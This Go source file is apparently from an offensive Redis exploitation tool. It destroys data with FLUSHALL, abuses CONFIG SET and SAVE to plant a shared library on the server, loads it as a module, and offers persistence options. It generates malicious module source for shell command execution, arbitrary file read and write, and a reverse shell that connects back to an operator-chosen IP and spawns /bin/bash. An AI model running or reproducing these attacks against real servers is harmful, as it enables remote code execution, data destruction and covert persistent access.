package exploitation

import (
	"0xRedisis/modules/core"
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
)

func RedisModuleExploitation(client *core.RedisClient) {
	fmt.Printf("\n%s=== Redis Module Exploitation ===%s\n", core.ColorBlue, core.ColorNC)

	// Check if modules are supported
	fmt.Printf("%s[*]%s Checking module support...\n", core.ColorBlue, core.ColorNC)

	modules, err := client.SendCommand("MODULE", "LIST")
	if err != nil {
		if strings.Contains(err.Error(), "unknown command") {
			fmt.Printf("%s[-]%s Redis modules not supported on this version\n", core.ColorRed, core.ColorNC)
			return
		}
		fmt.Printf("%s[-]%s Failed to check modules: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Module support detected\n", core.ColorGreen, core.ColorNC)
	if strings.TrimSpace(modules) != "" {
		fmt.Printf("%s[*]%s Currently loaded modules:\n%s%s%s\n",
			core.ColorBlue, core.ColorNC, core.ColorYellow, modules, core.ColorNC)
	} else {
		fmt.Printf("%s[*]%s No modules currently loaded\n", core.ColorBlue, core.ColorNC)
	}

	// Show module exploitation options
	fmt.Printf("\n%s[*]%s Module Exploitation Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Load malicious shared library (.so)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Exploit existing loaded modules\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Generate malicious Redis module\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Module-based persistence\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Unload/manage modules\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-5): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		loadMaliciousModule(client, reader)
	case "2":
		exploitExistingModules(client, reader)
	case "3":
		generateMaliciousModule(client, reader)
	case "4":
		moduleBasedPersistence(client, reader)
	case "5":
		manageModules(client, reader)
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
	}
}

func loadMaliciousModule(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Load Malicious Module ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Module Loading Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Upload and load custom .so file\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Use built-in malicious module template\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Load from existing file on target\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter choice (1-3): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		uploadMaliciousModule(client, reader)
	case "2":
		useBuiltinMaliciousModule(client, reader)
	case "3":
		loadExistingModule(client, reader)
	}
}

func uploadMaliciousModule(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter path to malicious .so file: ")
	filePath, _ := reader.ReadString('\n')
	filePath = strings.TrimSpace(filePath)

	// Read the .so file
	soData, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to read .so file: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Base64 encode the binary data
	encodedData := base64.StdEncoding.EncodeToString(soData)

	fmt.Print("Enter target path on Redis server (e.g., /tmp/evil.so): ")
	targetPath, _ := reader.ReadString('\n')
	targetPath = strings.TrimSpace(targetPath)

	// Upload using Redis data transfer
	fmt.Printf("%s[*]%s Uploading malicious module...\n", core.ColorBlue, core.ColorNC)

	// Clear database and set encoded data
	_, err = client.SendCommand("FLUSHALL")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to flush database: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	_, err = client.SendCommand("SET", "moduledata", encodedData)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set module data: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Configure save location
	pathParts := strings.Split(targetPath, "/")
	filename := pathParts[len(pathParts)-1]
	dir := strings.Join(pathParts[:len(pathParts)-1], "/")

	_, err = client.SendCommand("CONFIG", "SET", "dir", dir)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set directory: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", filename+".rdb")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set filename: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Save to disk
	_, err = client.SendCommand("SAVE")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to save: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Module uploaded (as RDB, needs extraction)\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s[*]%s You'll need to extract and load manually:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sbase64 -d %s.rdb > %s%s\n", core.ColorYellow, filename, targetPath, core.ColorNC)
	fmt.Printf("   %sMODULE LOAD %s%s\n", core.ColorYellow, targetPath, core.ColorNC)
}

func useBuiltinMaliciousModule(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Built-in Malicious Module ===%s\n", core.ColorBlue, core.ColorNC)

	// Generate simple malicious module template
	moduleCode := `
#include "redismodule.h"
#include <stdlib.h>
#include <unistd.h>

int EvilCommand_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc < 2) {
        return RedisModule_WrongArity(ctx);
    }
    
    size_t len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &len);
    
    // Execute system command
    int result = system(cmd);
    
    RedisModule_ReplyWithLongLong(ctx, result);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "evil", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    if (RedisModule_CreateCommand(ctx, "evil.exec", EvilCommand_RedisCommand, 
                                  "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    return REDISMODULE_OK;
}
`

	fmt.Printf("%s[*]%s Generated malicious module template:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s[*]%s This module adds 'evil.exec' command for system execution\n", core.ColorBlue, core.ColorNC)

	// Save to file
	err := os.WriteFile("evil_module.c", []byte(moduleCode), 0644)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to save module code: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Malicious module saved to: %sevil_module.c%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, core.ColorNC)

	fmt.Printf("\n%s[*]%s Compilation instructions:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sgcc -shared -fPIC -o evil.so evil_module.c%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   %sThen use option 1 to upload the compiled .so file%s\n", core.ColorYellow, core.ColorNC)
}

func loadExistingModule(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter path to existing .so file on target: ")
	modulePath, _ := reader.ReadString('\n')
	modulePath = strings.TrimSpace(modulePath)

	fmt.Printf("%s[*]%s Attempting to load module: %s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, modulePath, core.ColorNC)

	result, err := client.SendCommand("MODULE", "LOAD", modulePath)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to load module: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Module load result: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, result, core.ColorNC)

	// List loaded modules
	modules, _ := client.SendCommand("MODULE", "LIST")
	fmt.Printf("%s[*]%s Current modules:\n%s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, modules, core.ColorNC)
}

func exploitExistingModules(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Exploit Existing Modules ===%s\n", core.ColorBlue, core.ColorNC)

	// Get list of loaded modules
	modules, err := client.SendCommand("MODULE", "LIST")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get modules: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	if strings.TrimSpace(modules) == "" {
		fmt.Printf("%s[-]%s No modules loaded\n", core.ColorRed, core.ColorNC)
		return
	}

	fmt.Printf("%s[*]%s Loaded modules:\n%s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, modules, core.ColorNC)

	// Common vulnerable modules and exploits
	vulnerableModules := map[string][]string{
		"RedisJSON": {
			"JSON.SET vulnkey $ '{\"cmd\":\"whoami\"}'",
			"JSON.GET vulnkey",
		},
		"RediSearch": {
			"FT.CREATE idx SCHEMA title TEXT",
			"FT.SEARCH idx '*'",
		},
		"RedisGraph": {
			"GRAPH.QUERY social 'CREATE (n:Person {name:\"evil\"})'",
			"GRAPH.QUERY social 'MATCH (n) RETURN n'",
		},
	}

	fmt.Printf("\n%s[*]%s Known Exploitation Techniques:\n", core.ColorBlue, core.ColorNC)

	for moduleName, exploits := range vulnerableModules {
		if strings.Contains(strings.ToLower(modules), strings.ToLower(moduleName)) {
			fmt.Printf("\n%s[+]%s Found %s - Exploitation options:\n",
				core.ColorGreen, core.ColorNC, moduleName)

			for i, exploit := range exploits {
				fmt.Printf("   %s%d.%s %s\n", core.ColorYellow, i+1, core.ColorNC, exploit)
			}
		}
	}

	fmt.Print("\nEnter command to execute: ")
	command, _ := reader.ReadString('\n')
	command = strings.TrimSpace(command)

	if command != "" {
		result, err := client.SendCommand(strings.Fields(command)...)
		if err != nil {
			fmt.Printf("%s[-]%s Command failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		} else {
			fmt.Printf("%s[+]%s Result:\n%s%s%s\n",
				core.ColorGreen, core.ColorNC, core.ColorYellow, result, core.ColorNC)
		}
	}
}

func generateMaliciousModule(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Generate Malicious Module ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Module Templates:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Command execution module\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s File operation module\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Network operation module\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Reverse shell module\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter template choice (1-4): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var moduleTemplate string
	var moduleName string

	switch choice {
	case "1":
		moduleName = "cmdexec"
		moduleTemplate = generateCmdExecModule()
	case "2":
		moduleName = "fileops"
		moduleTemplate = generateFileOpsModule()
	case "3":
		moduleName = "netops"
		moduleTemplate = generateNetOpsModule()
	case "4":
		moduleName = "revshell"
		moduleTemplate = generateRevShellModule(reader)
	default:
		moduleName = "cmdexec"
		moduleTemplate = generateCmdExecModule()
	}

	filename := fmt.Sprintf("%s_module.c", moduleName)
	err := os.WriteFile(filename, []byte(moduleTemplate), 0644)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to save module: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Module generated: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, filename, core.ColorNC)

	generateMakefile(moduleName)
	fmt.Printf("%s[+]%s Makefile generated: %sMakefile_%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, moduleName, core.ColorNC)

	fmt.Printf("\n%s[*]%s Compilation instructions:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %smake -f Makefile_%s%s\n", core.ColorYellow, moduleName, core.ColorNC)
	fmt.Printf("   %sThis will create %s.so%s\n", core.ColorYellow, moduleName, core.ColorNC)
}

func generateCmdExecModule() string {
	return `#include "redismodule.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int CmdExec_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    }
    
    size_t len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &len);
    
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        RedisModule_ReplyWithError(ctx, "Failed to execute command");
        return REDISMODULE_OK;
    }
    
    char buffer[4096];
    char *result = malloc(1);
    result[0] = '\0';
    size_t result_len = 0;
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t buf_len = strlen(buffer);
        result = realloc(result, result_len + buf_len + 1);
        strcat(result, buffer);
        result_len += buf_len;
    }
    
    pclose(fp);
    
    RedisModule_ReplyWithStringBuffer(ctx, result, result_len);
    free(result);
    
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "cmdexec", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    if (RedisModule_CreateCommand(ctx, "cmdexec.exec", CmdExec_RedisCommand, 
                                  "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    return REDISMODULE_OK;
}`
}

func generateFileOpsModule() string {
	return `#include "redismodule.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int FileRead_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    
    size_t len;
    const char *filename = RedisModule_StringPtrLen(argv[1], &len);
    
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        RedisModule_ReplyWithError(ctx, "Cannot open file");
        return REDISMODULE_OK;
    }
    
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(file_size + 1);
    fread(content, 1, file_size, fp);
    content[file_size] = '\0';
    fclose(fp);
    
    RedisModule_ReplyWithStringBuffer(ctx, content, file_size);
    free(content);
    
    return REDISMODULE_OK;
}

int FileWrite_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) return RedisModule_WrongArity(ctx);
    
    size_t len1, len2;
    const char *filename = RedisModule_StringPtrLen(argv[1], &len1);
    const char *content = RedisModule_StringPtrLen(argv[2], &len2);
    
    FILE *fp = fopen(filename, "w");
    if (!fp) {
        RedisModule_ReplyWithError(ctx, "Cannot write file");
        return REDISMODULE_OK;
    }
    
    fwrite(content, 1, len2, fp);
    fclose(fp);
    
    RedisModule_ReplyWithSimpleString(ctx, "OK");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "fileops", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    if (RedisModule_CreateCommand(ctx, "fileops.read", FileRead_RedisCommand, 
                                  "readonly", 1, 1, 1) == REDISMODULE_ERR ||
        RedisModule_CreateCommand(ctx, "fileops.write", FileWrite_RedisCommand, 
                                  "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    return REDISMODULE_OK;
}`
}

func generateNetOpsModule() string {
	return `#include "redismodule.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

int NetConnect_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) return RedisModule_WrongArity(ctx);
    
    size_t len1, len2;
    const char *host = RedisModule_StringPtrLen(argv[1], &len1);
    const char *port_str = RedisModule_StringPtrLen(argv[2], &len2);
    
    int port = atoi(port_str);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        RedisModule_ReplyWithError(ctx, "Connection failed");
        return REDISMODULE_OK;
    }
    
    close(sock);
    RedisModule_ReplyWithSimpleString(ctx, "Connected");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "netops", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    if (RedisModule_CreateCommand(ctx, "netops.connect", NetConnect_RedisCommand, 
                                  "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    return REDISMODULE_OK;
}`
}

func generateRevShellModule(reader *bufio.Reader) string {
	fmt.Print("Enter your IP for reverse shell: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)

	if ip == "" {
		ip = core.GetLocalIP()
	}

	fmt.Print("Enter port for reverse shell: ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)

	if port == "" {
		port = "4444"
	}

	return fmt.Sprintf(`#include "redismodule.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int RevShell_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(%s);
    inet_pton(AF_INET, "%s", &server_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        RedisModule_ReplyWithError(ctx, "Connection failed");
        return REDISMODULE_OK;
    }
    
    dup2(sock, 0);
    dup2(sock, 1); 
    dup2(sock, 2);
    
    system("/bin/bash");
    close(sock);
    
    RedisModule_ReplyWithSimpleString(ctx, "Shell executed");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "revshell", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    if (RedisModule_CreateCommand(ctx, "revshell.connect", RevShell_RedisCommand, 
                                  "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    return REDISMODULE_OK;
}`, port, ip)
}

func generateMakefile(moduleName string) {
	makefile := fmt.Sprintf(`CC=gcc
CFLAGS=-fPIC -shared -std=c99 -O2

%s.so: %s_module.c
	$(CC) $(CFLAGS) -o $@ $<

clean:
	rm -f %s.so

.PHONY: clean
`, moduleName, moduleName, moduleName)

	os.WriteFile(fmt.Sprintf("Makefile_%s", moduleName), []byte(makefile), 0644)
}

func moduleBasedPersistence(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Module-Based Persistence ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Persistence Techniques:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Auto-load module on Redis restart\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Hide module from MODULE LIST\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Create persistent backdoor commands\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter choice (1-3): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		fmt.Printf("%s[*]%s To auto-load modules:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   %s1. Add to redis.conf: loadmodule /path/to/module.so%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   %s2. Or use CONFIG SET to modify at runtime%s\n", core.ColorYellow, core.ColorNC)

		fmt.Print("Enter module path to auto-load: ")
		modulePath, _ := reader.ReadString('\n')
		modulePath = strings.TrimSpace(modulePath)

		// This would typically require config file modification
		fmt.Printf("%s[*]%s Module persistence configured for: %s\n", core.ColorBlue, core.ColorNC, modulePath)

	case "2":
		fmt.Printf("%s[*]%s Module hiding techniques are advanced and require\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("   custom module code that manipulates MODULE LIST output\n")

	case "3":
		fmt.Printf("%s[*]%s Creating persistent backdoor...\n", core.ColorBlue, core.ColorNC)
		// Load a module that creates backdoor commands
		fmt.Printf("%s[+]%s Use the generated modules to create persistent access\n", core.ColorGreen, core.ColorNC)
	}
}

func manageModules(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Module Management ===%s\n", core.ColorBlue, core.ColorNC)

	// List current modules
	modules, err := client.SendCommand("MODULE", "LIST")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to list modules: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[*]%s Currently loaded modules:\n%s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, modules, core.ColorNC)

	fmt.Printf("\n%s[*]%s Management Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Unload a module\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Reload a module\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Get module info\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter choice (1-3): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		fmt.Print("Enter module name to unload: ")
		moduleName, _ := reader.ReadString('\n')
		moduleName = strings.TrimSpace(moduleName)

		result, err := client.SendCommand("MODULE", "UNLOAD", moduleName)
		if err != nil {
			fmt.Printf("%s[-]%s Failed to unload: %s\n", core.ColorRed, core.ColorNC, err.Error())
		} else {
			fmt.Printf("%s[+]%s Unload result: %s\n", core.ColorGreen, core.ColorNC, result)
		}

	case "2":
		fmt.Print("Enter module path to reload: ")
		modulePath, _ := reader.ReadString('\n')
		modulePath = strings.TrimSpace(modulePath)

		// First try to unload, then load
		result, err := client.SendCommand("MODULE", "LOAD", modulePath)
		if err != nil {
			fmt.Printf("%s[-]%s Failed to reload: %s\n", core.ColorRed, core.ColorNC, err.Error())
		} else {
			fmt.Printf("%s[+]%s Reload result: %s\n", core.ColorGreen, core.ColorNC, result)
		}

	case "3":
		// Show detailed module information
		fmt.Printf("%s[*]%s Detailed module information:\n", core.ColorBlue, core.ColorNC)
		info, _ := client.SendCommand("INFO", "modules")
		fmt.Printf("%s%s%s\n", core.ColorYellow, info, core.ColorNC)
	}
}
